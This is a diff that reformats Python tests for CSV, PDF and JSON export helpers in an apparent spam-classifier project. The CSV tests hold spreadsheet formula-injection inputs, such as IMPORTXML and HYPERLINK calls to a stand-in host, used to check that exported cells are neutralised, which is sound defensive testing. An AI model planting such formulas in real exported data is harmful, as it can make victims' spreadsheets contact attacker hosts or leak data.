@@ -32,13 +32,17 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 class TestCsvExportSafety:
     def test_formula_like_strings_are_prefixed(self):
-        assert _csv_safe_cell('=IMPORTXML("http://bad.example")').startswith("'=")
+        assert _csv_safe_cell('=IMPORTXML("http://bad.example")').startswith(
+            "'="
+        )
         assert _csv_safe_cell("+SUM(1,2)").startswith("'+")
         assert _csv_safe_cell("-10+20").startswith("'-")
         assert _csv_safe_cell("@cmd").startswith("'@")
 
     def test_leading_whitespace_before_formula_is_prefixed(self):
-        assert _csv_safe_cell('   =HYPERLINK("http://bad.example")').startswith("'")
+        assert _csv_safe_cell(
+            '   =HYPERLINK("http://bad.example")'
+        ).startswith("'")
 
     def test_normal_strings_and_numbers_are_unchanged(self):
         assert _csv_safe_cell("Free prize claim") == "Free prize claim"
@@ -130,7 +134,11 @@ class TestDataframeToPdf:
                     "label": "SPAM",
                     "confidence": "0.98",
                 },
-                {"message": "See you at 5pm", "label": "HAM", "confidence": "0.95"},
+                {
+                    "message": "See you at 5pm",
+                    "label": "HAM",
+                    "confidence": "0.95",
+                },
             ]
         )
         out = dataframe_to_pdf(df)
@@ -140,7 +148,10 @@ class TestDataframeToPdf:
         df = pd.DataFrame(
             [
                 {"message": "WIN \u20b95000 NOW \U0001f389", "label": "SPAM"},
-                {"message": "\u20ac1000 \u00a3500 \u2014 claim", "label": "SPAM"},
+                {
+                    "message": "\u20ac1000 \u00a3500 \u2014 claim",
+                    "label": "SPAM",
+                },
             ]
         )
         out = dataframe_to_pdf(df)
@@ -204,7 +215,9 @@ class TestHistoryToJson:
         history = [
             {
                 "message": "test",
-                "model_predictions": {"BERT": {"label": "SPAM", "score": 0.95}},
+                "model_predictions": {
+                    "BERT": {"label": "SPAM", "score": 0.95}
+                },
             }
         ]
         result = history_to_json(history)
